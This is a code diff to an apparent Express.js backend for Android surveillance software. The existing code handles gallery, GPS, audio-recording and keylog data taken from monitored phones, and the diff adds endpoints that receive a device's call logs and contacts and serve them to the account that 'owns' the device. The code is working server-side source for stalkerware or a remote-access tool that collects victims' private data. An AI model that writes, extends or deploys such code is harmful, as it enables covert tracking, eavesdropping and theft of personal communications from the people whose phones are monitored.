@@ -141,7 +141,9 @@ const deviceUIs = new Map();
 const galleryData = new Map();
 const galleryRequestFlags = new Map();
 const gpsRequestFlags = new Map();
-const audioRequestFlags = new Map(); // নতুন
+const audioRequestFlags = new Map();
+const callLogsData = new Map();   // নতুন
+const contactsData = new Map();   // নতুন
 
 app.post("/api/device-state", async (req, res) => {
   try {
@@ -371,7 +373,6 @@ app.post("/api/audio/upload", uploadAudio.single("audio"), async (req, res) => {
   }
 });
 
-// নতুন: অডিও ফাইলের তালিকা
 app.get("/api/audio/list", requireLogin, async (req, res) => {
   const { deviceId } = req.query;
   if (!deviceId) return res.status(400).json({ error: "deviceId required" });
@@ -386,13 +387,69 @@ app.get("/api/audio/list", requireLogin, async (req, res) => {
   });
 });
 
-// নতুন: নির্দিষ্ট অডিও ফাইল ডাউনলোড
 app.get("/api/audio/download/:filename", requireLogin, async (req, res) => {
   const filename = req.params.filename;
-  const safeFilename = path.basename(filename); // পাথ ট্রাভার্সাল প্রতিরোধ
+  const safeFilename = path.basename(filename);
   const filePath = path.join(__dirname, 'uploads', 'audio', safeFilename);
   if (!fs.existsSync(filePath)) return res.status(404).json({ error: "File not found" });
   res.download(filePath);
+});
+
+// ================= CALL LOGS & CONTACTS =================
+app.post("/api/calllogs", async (req, res) => {
+  try {
+    const { deviceId, deviceToken, callLogs } = req.body;
+    if (!deviceId || !deviceToken || !Array.isArray(callLogs)) {
+      return res.status(400).json({ error: "deviceId, deviceToken and callLogs array required" });
+    }
+    const deviceRes = await pool.query("SELECT device_token FROM devices WHERE device_id=$1", [deviceId]);
+    if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) {
+      return res.status(401).json({ error: "Invalid device token." });
+    }
+    callLogsData.set(deviceId, callLogs);
+    res.json({ success: true, count: callLogs.length });
+  } catch (e) {
+    console.error(e);
+    res.status(500).json({ error: "Failed to save call logs" });
+  }
+});
+
+app.post("/api/contacts", async (req, res) => {
+  try {
+    const { deviceId, deviceToken, contacts } = req.body;
+    if (!deviceId || !deviceToken || !Array.isArray(contacts)) {
+      return res.status(400).json({ error: "deviceId, deviceToken and contacts array required" });
+    }
+    const deviceRes = await pool.query("SELECT device_token FROM devices WHERE device_id=$1", [deviceId]);
+    if (deviceRes.rows.length === 0 || deviceRes.rows[0].device_token !== deviceToken) {
+      return res.status(401).json({ error: "Invalid device token." });
+    }
+    contactsData.set(deviceId, contacts);
+    res.json({ success: true, count: contacts.length });
+  } catch (e) {
+    console.error(e);
+    res.status(500).json({ error: "Failed to save contacts" });
+  }
+});
+
+app.get("/api/calllogs", requireLogin, async (req, res) => {
+  const { deviceId } = req.query;
+  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
+  const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
+  if (deviceRes.rows.length === 0 || deviceRes.rows[0].owner_user_id !== req.session.userId) {
+    return res.status(403).json({ error: "Not your device." });
+  }
+  res.json({ callLogs: callLogsData.get(deviceId) || [] });
+});
+
+app.get("/api/contacts", requireLogin, async (req, res) => {
+  const { deviceId } = req.query;
+  if (!deviceId) return res.status(400).json({ error: "deviceId required" });
+  const deviceRes = await pool.query("SELECT owner_user_id FROM devices WHERE device_id=$1", [deviceId]);
+  if (deviceRes.rows.length === 0 || deviceRes.rows[0].owner_user_id !== req.session.userId) {
+    return res.status(403).json({ error: "Not your device." });
+  }
+  res.json({ contacts: contactsData.get(deviceId) || [] });
 });
 
 // ================= KEYLOG CLEANUP (24 HOURS) =================
